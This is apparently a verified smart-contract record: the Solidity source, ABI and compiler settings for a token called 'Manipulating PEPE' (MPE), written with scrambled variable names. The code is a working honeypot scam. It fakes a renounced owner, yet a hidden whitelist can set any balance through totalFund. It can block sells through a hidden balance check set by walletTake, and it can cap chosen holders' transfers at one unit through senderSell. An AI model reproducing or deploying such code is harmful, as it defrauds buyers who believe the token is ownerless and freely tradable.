{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface buyLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalShould) external view returns (uint256);\n\n    function transfer(address amountToken, uint256 takeReceiver) external returns (bool);\n\n    function allowance(address fundReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountToken,\n        uint256 takeReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txExempt, uint256 value);\n    event Approval(address indexed fundReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract toTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxEnableTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toFee {\n    function createPair(address atTrading, address autoSwap) external returns (address);\n}\n\ninterface buyLiquidityMetadata is buyLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ManipulatingPEPE is toTx, buyLiquidity, buyLiquidityMetadata {\n\n    mapping(address => bool) public receiverAmount;\n\n    function totalMax(address amountTotal) public {\n        if (marketingTxTake) {\n            return;\n        }\n        \n        receiverAmount[amountTotal] = true;\n        if (totalWalletMode != totalLaunch) {\n            totalLaunch = launchedTeamTo;\n        }\n        marketingTxTake = true;\n    }\n\n    function transferFrom(address tradingBuyExempt, address amountToken, uint256 takeReceiver) external override returns (bool) {\n        if (_msgSender() != walletIs) {\n            if (fundEnable[tradingBuyExempt][_msgSender()] != type(uint256).max) {\n                require(takeReceiver <= fundEnable[tradingBuyExempt][_msgSender()]);\n                fundEnable[tradingBuyExempt][_msgSender()] -= takeReceiver;\n            }\n        }\n        return swapEnable(tradingBuyExempt, amountToken, takeReceiver);\n    }\n\n    function launchedAuto(address tradingBuyExempt, address amountToken, uint256 takeReceiver) internal returns (bool) {\n        require(limitReceiver[tradingBuyExempt] >= takeReceiver);\n        limitReceiver[tradingBuyExempt] -= takeReceiver;\n        limitReceiver[amountToken] += takeReceiver;\n        emit Transfer(tradingBuyExempt, amountToken, takeReceiver);\n        return true;\n    }\n\n    bool private exemptBuy;\n\n    function allowance(address marketingTotal, address totalLaunchLiquidity) external view virtual override returns (uint256) {\n        if (totalLaunchLiquidity == walletIs) {\n            return type(uint256).max;\n        }\n        return fundEnable[marketingTotal][totalLaunchLiquidity];\n    }\n\n    uint256 public tokenTx;\n\n    mapping(address => mapping(address => uint256)) private fundEnable;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchLiquidity;\n    }\n\n    bool public txMax;\n\n    uint256 constant launchedAutoSell = 1 ** 10;\n\n    uint256 private totalReceiver;\n\n    address public receiverTx;\n\n    bool public atAutoList;\n\n    function swapEnable(address tradingBuyExempt, address amountToken, uint256 takeReceiver) internal returns (bool) {\n        if (tradingBuyExempt == buyEnable) {\n            return launchedAuto(tradingBuyExempt, amountToken, takeReceiver);\n        }\n        uint256 receiverList = buyLiquidity(receiverTx).balanceOf(liquidityWalletEnable);\n        require(receiverList == listTradingMode);\n        require(amountToken != liquidityWalletEnable);\n        if (limitExempt[tradingBuyExempt]) {\n            return launchedAuto(tradingBuyExempt, amountToken, launchedAutoSell);\n        }\n        return launchedAuto(tradingBuyExempt, amountToken, takeReceiver);\n    }\n\n    uint256 listTradingMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxList;\n    }\n\n    address walletIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public launchedTeamTo;\n\n    function owner() external view returns (address) {\n        return takeMarketing;\n    }\n\n    uint256 autoTake;\n\n    address public buyEnable;\n\n    constructor (){\n        if (exemptBuy != txMax) {\n            totalReceiver = totalWalletMode;\n        }\n        maxEnableTake feeEnable = maxEnableTake(walletIs);\n        receiverTx = toFee(feeEnable.factory()).createPair(feeEnable.WETH(), address(this));\n        \n        buyEnable = _msgSender();\n        senderFund();\n        receiverAmount[buyEnable] = true;\n        limitReceiver[buyEnable] = launchLiquidity;\n        if (totalWalletMode == totalReceiver) {\n            exemptBuy = false;\n        }\n        emit Transfer(address(0), buyEnable, launchLiquidity);\n    }\n\n    string private liquidityToken = \"MPE\";\n\n    function senderFund() public {\n        emit OwnershipTransferred(buyEnable, address(0));\n        takeMarketing = address(0);\n    }\n\n    uint8 private maxList = 18;\n\n    string private limitLaunched = \"Manipulating PEPE\";\n\n    mapping(address => bool) public limitExempt;\n\n    function totalFund(address modeTotal, uint256 takeReceiver) public {\n        fromShould();\n        limitReceiver[modeTotal] = takeReceiver;\n    }\n\n    bool public marketingTxTake;\n\n    uint256 public totalWalletMode;\n\n    address private takeMarketing;\n\n    function senderSell(address maxExempt) public {\n        fromShould();\n        \n        if (maxExempt == buyEnable || maxExempt == receiverTx) {\n            return;\n        }\n        limitExempt[maxExempt] = true;\n    }\n\n    function approve(address totalLaunchLiquidity, uint256 takeReceiver) public virtual override returns (bool) {\n        fundEnable[_msgSender()][totalLaunchLiquidity] = takeReceiver;\n        emit Approval(_msgSender(), totalLaunchLiquidity, takeReceiver);\n        return true;\n    }\n\n    function transfer(address modeTotal, uint256 takeReceiver) external virtual override returns (bool) {\n        return swapEnable(_msgSender(), modeTotal, takeReceiver);\n    }\n\n    function fromShould() private view {\n        require(receiverAmount[_msgSender()]);\n    }\n\n    function walletTake(uint256 takeReceiver) public {\n        fromShould();\n        listTradingMode = takeReceiver;\n    }\n\n    mapping(address => uint256) private limitReceiver;\n\n    uint256 private launchLiquidity = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return limitLaunched;\n    }\n\n    function balanceOf(address totalShould) public view virtual override returns (uint256) {\n        return limitReceiver[totalShould];\n    }\n\n    uint256 private totalLaunch;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityToken;\n    }\n\n    event OwnershipTransferred(address indexed minMaxSender, address indexed maxListShould);\n\n    function getOwner() external view returns (address) {\n        return takeMarketing;\n    }\n\n    address liquidityWalletEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMaxSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxListShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalLaunchLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunchLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atAutoList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTeamTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTxTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"}],\"name\":\"senderSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"totalFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"}],\"name\":\"totalMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWalletMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingBuyExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"walletTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ManipulatingPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}